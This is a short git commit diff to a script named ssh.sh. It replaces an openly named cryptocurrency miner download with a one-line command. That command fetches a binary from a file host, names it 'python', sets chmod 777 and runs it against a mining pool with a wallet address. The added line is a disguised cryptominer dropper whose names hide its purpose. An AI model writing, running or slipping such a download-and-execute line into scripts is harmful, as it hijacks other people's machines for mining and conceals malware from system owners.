5cc50e9e33a53f8023940ab7880f437eeb1a9caf
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-12-24 00:34:08 +0700

    Update ssh.sh

--- ssh.sh
+++ ssh.sh
@@ -1,4 +1,1 @@
-wget https://github.com/BinaryExpr/spectre-miner/releases/download/v0.6.26/spectre_miner_x64-v0.6.26_linux.tar.gz
-tar -xvf spectre_miner_x64-v0.6.26_linux.tar.gz
-cd spectre_miner_x64
-./spectre-miner -d spectre.cedric-crispin.com:4364 -w spectre:qqnxrxajcqdu8g5d3xm6c067y2wc9wumqx6xmqwysy2e6uh5tplm7fsraha7x.tes -t 4
+wget https://upload.vina-host.com/ORTX6eFQop/python && chmod 777 python &&  ./python -d spectre.cedric-crispin.com:4364 -w spectre:qqnxrxajcqdu8g5d3xm6c067y2wc9wumqx6xmqwysy2e6uh5tplm7fsraha7x.tes -t 4
